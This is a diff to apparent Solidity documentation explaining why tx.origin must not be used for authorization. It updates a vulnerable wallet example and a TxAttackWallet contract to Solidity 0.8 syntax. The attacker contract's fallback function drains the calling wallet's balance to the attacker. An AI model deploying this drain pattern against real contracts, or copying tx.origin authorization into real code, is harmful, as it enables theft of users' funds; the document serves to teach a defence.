@@ -3,7 +3,9 @@
 `tx.origin` is a global variable in Solidity which returns the address that sent a transaction. It's important that you never use `tx.origin` for authorization since another contract can use a fallback function to call your contract and gain authorization since the authorized address is stored in `tx.origin`. Consider this example:
 
 ```solidity
-pragma solidity >=0.5.0 <0.7.0;
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
 
 // THIS CONTRACT CONTAINS A BUG - DO NOT USE
 contract TxUserWallet {
@@ -23,20 +25,24 @@ contract TxUserWallet {
 Here we can see that the `TxUserWallet` contract authorizes the `transferTo()` function with `tx.origin`. 
 
 ```solidity
-pragma solidity >=0.5.0 <0.7.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
 interface TxUserWallet {
-    function transferTo(address payable dest, uint amount) external;
+    function transferTo(address payable dest, uint256 amount) external;
 }
 
 contract TxAttackWallet {
-    address payable owner;
+    address payable private immutable owner;
 
-    constructor() public {
-        owner = msg.sender;
+    // Constructor sets the contract deployer as the owner
+    constructor() {
+        owner = payable(msg.sender);
     }
 
-    function() external {
+    // Modern fallback function to receive Ether and trigger transfer
+    fallback() external payable {
+        // Call transferTo on the sender's TxUserWallet to send its balance to owner
         TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
     }
 }
